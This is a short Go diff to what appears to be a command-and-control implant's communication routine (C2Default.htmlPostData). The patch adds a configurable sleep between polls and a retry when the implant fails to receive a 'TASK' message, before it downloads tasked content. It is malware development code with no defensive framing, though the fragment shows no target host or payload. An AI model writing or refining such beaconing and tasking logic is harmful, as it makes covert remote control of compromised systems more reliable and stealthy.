@@ -368,7 +368,10 @@ func (c *C2Default) htmlPostData(sendData []byte) []byte {
 				maxSleep := 30
 				rand.Seed(time.Now().UnixNano())
 				time.Sleep(time.Duration(rand.Intn(maxSleep-minSleep)+minSleep) * time.Second)
+			} else {
+				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			}
+			
 
 			title, body, err = c.get_message_content(base_url, token, msg_id)
 			if err != nil {
@@ -379,6 +382,11 @@ func (c *C2Default) htmlPostData(sendData []byte) []byte {
 			if title == "TASK" {
 				break
 			}
+		}
+		
+		// Failed to get tasking
+		if title != "TASK" {
+			continue
 		}
 
 		respBody, err := c.download_file(base_url, token, body)
